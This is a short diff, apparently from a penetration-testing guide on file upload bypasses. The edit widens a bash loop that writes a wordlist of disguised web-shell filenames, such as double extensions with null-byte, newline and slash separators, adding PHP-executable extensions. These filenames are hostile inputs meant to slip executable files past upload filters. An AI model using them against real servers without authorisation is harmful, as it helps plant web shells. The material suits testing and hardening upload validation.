@@ -114,7 +114,7 @@ We can use a script to generate all permutations of the above techniques to uplo
 
 # double extensions
 for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':' ''; do
-    for ext in '.phar' '.phps'; do
+    for ext in '.phar' '.phps' '.phtm' '.pht' '.pgif' ''; do
         echo "shell$char$ext.jpg" >> wordlist.txt
         echo "shell$ext$char.jpg" >> wordlist.txt
         echo "shell.jpg$char$ext" >> wordlist.txt
